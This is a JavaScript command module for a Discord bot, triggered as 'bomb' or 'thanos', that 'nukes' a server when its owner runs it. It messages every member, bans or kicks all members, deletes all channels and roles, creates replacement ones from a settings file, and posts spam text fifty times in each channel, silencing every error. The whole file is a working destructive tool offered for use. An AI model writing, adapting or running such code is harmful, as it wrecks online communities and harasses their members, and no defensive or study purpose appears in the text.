const settings = require("../base/settings.json");
const [roleNames, spams, channelNames, dmText, owner] = [settings.bomb.roles, settings.bomb.spamChannelText, settings.bomb.channelNames, settings.bomb.dmText, settings.owner];
const advancedSettings = settings.advancedSettings;

module.exports = {
    slash: false,
    enable: true,
    name: ['bomb', 'thanos'],

    async execute(client, message, args) {
        /* Owner control */
        if (owner !== message.author.id) return;

        /* Save members to array */
        let members = await message.guild.members.fetch();
        members = await members.map(x => x);

        /* Announcement to Members */
        if (advancedSettings.dm) {
            for await (const x of members) {
                await x.user.send({ content: dmText }).catch(() => { })
            }
        }

        /* Ban Members */
        if (advancedSettings.ban) {
            for await (const x of members) {
                if (x.bannable) await message.guild.bans.create(x.id).catch(() => { });
                else if (x.kicknable) await message.guild.members.kick(x).catch(() => { });
            }
        }

        /* Channels Delete */
        if (advancedSettings.channelDelete) {
            let channels = await message.guild.channels.fetch();
            if (channels) {
                channels = await channels.map(x => x);
                for (x of channels) {
                    if (x.deletable) await x.delete().catch(() => { });
                }
            }
        }

        /* Channel Create */
        if (advancedSettings.channelCreate) {
            for await (x of channelNames) {
                await message.guild.channels.create({ name: x }).catch(() => { });
            }
        }

        /* Roles Delete */
        if (advancedSettings.roleDelete) {
            let roles = await message.guild.roles.fetch();
            if (roles) {
                roles = await roles.map(x => x);
                for await (x of roles) {
                    await x.delete().catch(() => { });
                }
            }
        }

        /* Roles Create */
        if (advancedSettings.roleCreate) {
            for await (x of roleNames) {
                await message.guild.roles.create({ name: x }).catch(() => { });
            }
        }

        /* Channel Spam */
        if (advancedSettings.channelSpam) {
            let channels = await message.guild.channels.fetch();
            if (channels) {
                channels = await channels.map(x => x);
                channels.forEach(async channel => {
                    for (let i = 0; i < 50; i++) {
                        await channel.send({ content: spams }).catch(() => { });
                    }  
                });
            }
        }
    },
};
